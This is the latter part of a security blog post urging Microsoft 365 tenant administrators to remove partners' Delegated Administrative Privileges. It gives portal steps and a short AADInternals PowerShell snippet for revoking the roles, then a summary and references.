Microsoft Threat Intelligence Center (MSTIC) <a href="https://docs.microsoft.com/en-us/partner-center/announcements/2021-november#details-16" target="_blank">recommends</a> partners to move using GDAP:</p>

<blockquote>
<p>We highly recommend moving away from the current DAP model (which gives admin agents standing or perpetual global admin access) to a fine-grained delegated access model. The fine-grained delegated access model <strong>reduces the security risk to customers</strong>, and the impact on them as well. It also gives you control and flexibility to restrict access per customer at the workload level of your employees who are managing your customers&rsquo; services and environments.</p>
</blockquote>

<p>While GDAP will reduce risk, it doesn&rsquo;t remove it completely. The only way to prevent this is <strong>to get rid off all DAP permissions</strong> - which I urge everyone to do immediately!</p>

<p>But what does this mean in practice? According to Microsoft <a href="https://docs.microsoft.com/en-us/microsoft-365/commerce/manage-partners?view=o365-worldwide#remove-partner-admin-roles" target="_blank">documentation</a>:</p>

<blockquote>
<p>You can remove admin roles from a partner at any time. <strong>Removing the admin roles doesn‚Äôt remove the partner relationship.</strong> They can still work with you in a different capacity, such as a Reseller. If you decide that you don‚Äôt want to work with a partner anymore, contact your partner to end the relationship.</p>
</blockquote>

<p>This means that you can safely remove DAP roles, it has no effect on other type of relationships. However, as pointed by Petr Vlk (<a href="https://twitter.com/Kazzan" target="_blank">@Kazzan</a>), DAP is <a href="https://docs.microsoft.com/en-us/microsoft-365/lighthouse/m365-lighthouse-requirements" target="_blank">required</a> by
<a href="https://docs.microsoft.com/en-us/microsoft-365/lighthouse/m365-lighthouse-overview" target="_blank">Microsoft Office 365 Lighthouse</a>, an admin portal for Managed Service Providers (MSPs) for managing at scale multiple SMB organisations.</p>

<p>My standpoint is always the security of customers, which overrules the business benefits of partners. Therefore, the correct (secure) way to give partners access to your tenant is to create them accounts that you manage.</p>

<p>Customer&rsquo;s Global administrators can remove DAP at <a href="https://admin.microsoft.com/Adminportal/Home?source=applauncher#/partners:">https://admin.microsoft.com/Adminportal/Home?source=applauncher#/partners:</a>
<img src="/images/posts/partners_14.png" alt="Partners" /></p>

<p><img src="/images/posts/partners_15.png" alt="Partners" /></p>

<p><img src="/images/posts/partners_16.png" alt="Partners" /></p>

<p>To remove DAP with <strong>AADInternals</strong> as customer&rsquo;s Global administrator:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get access tokens and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForMSPartner</span> <span class="n">-SaveToCache</span>
<span class="nb">Get-AADIntAccessTokenForAdmin</span> <span class="n">-SaveToCache</span>

<span class="c"># Remove DAP from all partners</span>
<span class="nb">Get-AADIntMSPartners</span> <span class="p">|</span> <span class="p">%{</span><span class="nb">Remove-AADIntMSPartnerDelegatedAdminRoles</span> <span class="n">-TenantId</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Identity</span><span class="p">}</span></code></pre></div></p>

<pre><code>responseCode message
------------ -------
success 
success 
success 
</code></pre>

<h2 id="adding-new-partners-1">Adding new partners</h2>

<p>Only way to prevent this is to minimise the number or Global administrators, and/or allowing them to access Azure AD only from Pivileged Access Workstations (PAWs).</p>

<h1 id="summary">Summary</h1>

<p>Delegated Administrative Privileges (DAP) are dangerous and out-dated way to give administrator access to your tenant for your partners or service providers.</p>

<p>Threat actors are targeting partner organisations as compromising a single partner tenant gives them access to all partner&rsquo;s customers too.</p>

<p>I suggest all admins to remove all DAP permissions to secure their tenants. Removing DAP doesn&rsquo;t remove the partner relationship, so it doesn&rsquo;t affect any licensing contracts you may have.
This does, however, remove all partner access via PowerShell and APIs, including Microsoft 365 Lighthouse.</p>

<p>If you need to give admin access to your partners, create a dedicated accounts for each partner (and user) to your tenant so that you can manage the accounts.</p>

<h1 id="references">References</h1>

<ul>
<li>Microsoft: <a href="https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/" target="_blank">NOBELIUM targeting delegated administrative privileges to facilitate broader attacks</a></li>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/microsoft-365/commerce/manage-partners" target="_blank">Manage partner relationships</a></li>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/partner-center/customers-revoke-admin-privileges#delegated-admin-privileges-in-azure-ad" target="_blank">Delegated admin privileges in Azure AD</a></li>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/microsoft-365/lighthouse/m365-lighthouse-requirements" target="_blank">Requirements for Microsoft 365 Lighthouse</a></li>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/microsoft-365/lighthouse/m365-lighthouse-overview" target="_blank">Overview of Microsoft 365 Lighthouse</a></li>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/partner-center/announcements/2021-november#5" target="_blank">Coming in early 2022: granular delegated admin privileges (GDAP)</a></li>
<li>Syynimaa, N. and Viitanen, T. (2018). <a href="/images/posts/Syynimaa & Viitanen (2018). Is my Office 365 GDPR Compliant Security Issues in Authentication and Administration.pdf" target="_blank">Is My Office 365 GDPR Compliant? - Security Issues in Authentication and Administration</a>. In Proceedings of the 20th International Conference on Enterprise Information Systems - Volume 2: ICEIS, ISBN 978-989-758-298-1; ISSN 2184-4992, pages 299-305.</li>
</ul>
		</div>
		
<div class="post__tags tags clearfix">
	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewBox="0 0 16 16">
	
	<ul class="tags__list">
		<li class="tags__item"><a class="tags__link" href="/tags/azure-active-directory/" rel="tag">Azure Active Directory</a></li>
		<li class="tags__item"><a class="tags__link" href="/tags/partner/" rel="tag">partner</a></li>
	</ul>
</div>

		<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fpartners%2f&text=Microsoft%20partners%3a%20The%20Good%2c%20The%20Bad%2c%20or%20The%20Ugly%3f&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fpartners%2f&mini=true&title=Microsoft%20partners%3a%20The%20Good%2c%20The%20Bad%2c%20or%20The%20Ugly%3f&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
	</article>
	
<div class="authorbox clearfix">
	<figure class="authorbox__avatar">
		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
	</figure>
	<div class="authorbox__header">
		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
	</div>
	<div class="authorbox__description">
		Dr Syynimaa works as Senior Principal Information Security Researcher at Secureworks CTU (Counter Threat Unit). <br> Before moving to his current position, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Azure AD security. <br><br>Dr Syynimaa is Microsoft Certified Expert (Microsoft 365), Microsoft Certified Azure Solutions Architect Expert, Microsoft Certified Trainer, Microsoft MVP (Enterprise Mobility, Identity and Access &amp; Intune), and Microsoft Most Valuable Security Researcher (MVR).
	</div>
</div>
	
<nav class="post-nav row clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<div class="post-nav__item post-nav__item--prev col-1-2">
		<a class="post-nav__link" href="/post/admintools/" rel="prev"><span class="post-nav__caption">¬´Previous</span><p class="post-nav__post-title">AADInternals admin and blue team tools</p></a>
	</div>
	<div class="post-nav__item post-nav__item--next col-1-2">
		<a class="post-nav__link" href="/post/deviceidentity/" rel="next"><span class="post-nav__caption">Next¬ª</span><p class="post-nav__post-title">Stealing and faking Azure AD device identities</p></a>
	</div>
</nav>

	
<div class="comments">
	<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "o365blog-com" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

</main>

<aside class="sidebar" itemscope="itemscope" itemtype="http://schema.org/WPSideBar">
	
<div class="widget-search widget">
	<form class="widget-search__form" role="search" method="get" action="//google.com/search">
		<label>
			<span class="screen-reader-text">Search for:</span>
			<input class="widget-search__field" type="search" placeholder="SEARCH..." value="" name="q">
		</label>
		<input class="widget-search__submit" type="submit" value="Search">
		<input type="hidden" name="sitesearch" value="http://o365blog.com" />
	</form>
</div>
	
<div class="widget-recent widget">
	<h4 class="widget__title">Recent Posts</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/post/pta/">Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/gmsa/">Hunt for the gMSA secrets</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/august_2022/">AADInternals World Tour August 2022: USA</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/deviceidentity/">Stealing and faking Azure AD device identities</a></li>
			<li class="widget__item"><a class="widget__link" href="/post/partners/">Microsoft partners: The Good, The Bad, or The Ugly?</a></li>
		</ul>
	</div>
</div>

	
<div class="widget-categories widget">
	<h4 class="widget__title">Categories</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/categories/"></a></li>
			<li class="widget__item"><a class="widget__link" href="/categories/article">Article</a></li>
			<li class="widget__item"><a class="widget__link" href="/categories/blog">Blog</a></li>
		</ul>
	</div>
</div>
	
<div class="widget-social widget">
	<h4 class="widget-social__title widget__title">Social</h4>
	<div class="widget-social__content widget__content">
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="Twitter" rel="noopener noreferrer" href="https://twitter.com/DrAzureAD" target="_blank">
				<svg class="widget-social__link-icon icon-twitter" viewBox="0 0 384 312" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg>
				<span>Twitter</span>
			</a>
		</div>
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="" rel="noopener noreferrer" href="https://linkedin.com/in/nestori" target="_blank">
				<svg class="widget-social__link-icon icon-linkedin" viewBox="0 0 352 352" width="24" height="24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M0,40v272c0,21.9,18.1,40,40,40h272c21.9,0,40-18.1,40-40V40c0-21.9-18.1-40-40-40H40C18.1,0,0,18.1,0,40z M312,32 c4.6,0,8,3.4,8,8v272c0,4.6-3.4,8-8,8H40c-4.6,0-8-3.4-8-8V40c0-4.6,3.4-8,8-8H312z M59.5,87c0,15.2,12.3,27.5,27.5,27.5 c15.2,0,27.5-12.3,27.5-27.5c0-15.2-12.3-27.5-27.5-27.5C71.8,59.5,59.5,71.8,59.5,87z M187,157h-1v-21h-45v152h47v-75 c0-19.8,3.9-39,28.5-39c24.2,0,24.5,22.4,24.5,40v74h47v-83.5c0-40.9-8.7-72-56.5-72C208.5,132.5,193.3,145.1,187,157z M64,288h47.5 V136H64V288z"/></svg>
				<span>LinkedIn</span>
			</a>
		</div>
		<div class="widget-social__item widget__item">
			<a class="widget-social__link widget__link btn" title="Email" href="mailto:nestori.syynimaa@gerenios.com">
				<svg class="widget-social__link-icon icon-mail" viewBox="0 0 416 288" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
				<span>nestori.syynimaa@gerenios.com</span>
			</a>
		</div>
	</div>
</div>

	
<div class="widget-taglist widget">
	<h4 class="widget__title">Tags</h4>
	<div class="widget__content">
		<a class="widget__link widget__link--taglist" href="/tags/aadconnect" title="aadconnect">aadconnect (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/aadinternals" title="aadinternals">aadinternals (10)</a>
		<a class="widget__link widget__link--taglist" href="/tags/abusing" title="abusing">abusing (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/active-directory" title="active-directory">active-directory (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/adfs" title="adfs">adfs (5)</a>
		<a class="widget__link widget__link--taglist" href="/tags/admin" title="admin">admin (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/administration" title="administration">administration (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/authentication" title="authentication">authentication (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azure" title="azure">azure (20)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azure-active-directory" title="azure-active-directory">azure-active-directory (27)</a>
		<a class="widget__link widget__link--taglist" href="/tags/azuread" title="azuread">azuread (4)</a>
		<a class="widget__link widget__link--taglist" href="/tags/backdoor" title="backdoor">backdoor (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/blackhat" title="blackhat">blackhat (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/blue-team" title="blue-team">blue-team (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/bprt" title="bprt">bprt (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/browser" title="browser">browser (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/compromise" title="compromise">compromise (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/conferences" title="conferences">conferences (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/defcon" title="defcon">defcon (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/desktop-sso" title="desktop-sso">desktop-sso (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/device" title="device">device (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/dns" title="dns">dns (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/email" title="email">email (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/encryption" title="encryption">encryption (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/exchange" title="exchange">exchange (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/federation" title="federation">federation (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/forensics" title="forensics">forensics (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/gdpr" title="gdpr">gdpr (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/global-administrator" title="global-administrator">global-administrator (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/graph" title="graph">graph (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/groups" title="groups">groups (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/guest" title="guest">guest (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/hybrid-join" title="hybrid-join">hybrid-join (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/identity" title="identity">identity (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/inactive" title="inactive">inactive (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/insider" title="insider">insider (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/intune" title="intune">intune (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/join" title="join">join (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/logs" title="logs">logs (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mailbox" title="mailbox">mailbox (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mdm" title="mdm">mdm (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/mfa" title="mfa">mfa (6)</a>
		<a class="widget__link widget__link--taglist" href="/tags/office-365" title="office-365">office-365 (9)</a>
		<a class="widget__link widget__link--taglist" href="/tags/office365" title="office365">office365 (9)</a>
		<a class="widget__link widget__link--taglist" href="/tags/on-prem" title="on-prem">on-prem (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/onedrive" title="onedrive">onedrive (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/outsider" title="outsider">outsider (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/partner" title="partner">partner (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/password" title="password">password (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/persistence" title="persistence">persistence (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/phishing" title="phishing">phishing (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/planner" title="planner">planner (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/powershell" title="powershell">powershell (13)</a>
		<a class="widget__link widget__link--taglist" href="/tags/prt" title="prt">prt (6)</a>
		<a class="widget__link widget__link--taglist" href="/tags/pta" title="pta">pta (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/recon" title="recon">recon (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/reconnaissance" title="reconnaissance">reconnaissance (4)</a>
		<a class="widget__link widget__link--taglist" href="/tags/seamless-sso" title="seamless-sso">seamless-sso (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/security" title="security">security (31)</a>
		<a class="widget__link widget__link--taglist" href="/tags/sso" title="sso">sso (2)</a>
		<a class="widget__link widget__link--taglist" href="/tags/sync" title="sync">sync (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/synchronisation" title="synchronisation">synchronisation (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/t2" title="t2">t2 (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/talks" title="talks">talks (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/teams" title="teams">teams (3)</a>
		<a class="widget__link widget__link--taglist" href="/tags/user" title="user">user (1)</a>
		<a class="widget__link widget__link--taglist" href="/tags/virtual-machine" title="virtual-machine">virtual-machine (1)</a>
	</div>
</div>
</aside>

	</div>
		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
			<div class="container container-inner">
				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
			</div>
		</footer>
	</div>

<script>
	var navigation = responsiveNav(".menu", {
		navClass: "menu--collapse",
	});
</script>
</body>
</html>
